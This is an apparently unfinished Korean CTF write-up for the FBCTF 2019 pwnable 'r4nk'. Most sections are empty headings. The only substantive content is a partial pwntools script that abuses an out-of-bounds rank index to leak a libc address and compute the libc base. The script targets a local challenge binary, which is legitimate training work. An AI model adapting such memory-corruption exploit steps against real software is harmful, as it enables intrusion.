---
title: FBCTF 2019 - r4nk
categories:
 - pwnable
tags: oob
---

```sh
wE1c0m3 t0 tItLe R4nK
=====================

1. Show
2. Rank
3. Quit
> 
```


- Introduction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점
- Reference


## Introduction

오늘 아무것도 안함.. 너무 좋다.('20.09.05)

## Vunlnerability
## Exploit
## slv.py

```python
from pwn import *

p = process('./r4nk')

sla = lambda s,c : p.sendlineafter(s, str(c))


context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
context.log_level = 'debug'
script='''
'''

strtol_offset = 0x451c0

def show():
    
    sla('> ', 1)
    
    return p.recvuntil('Show')


def rank(title, rank):
    
    sla('> ', 2)
    
    sla('> ', title)
    
    sla('>' , rank)

    return

def main():
    
    gdb.attach(p,script)
    rank(0, -263014)
    
    libc_leak = u64(show().split('\n')[0][3:].ljust(8,'\x00'))
    
    
    log.info("libc_leak : " + hex(libc_leak))
    
    
    libc_base = libc_leak - strtol_offset
    
    
    
    p.interactive()
    
    
    
    return

if __name__ == '__main__':
    main()
```
## 느낀 점
## Reference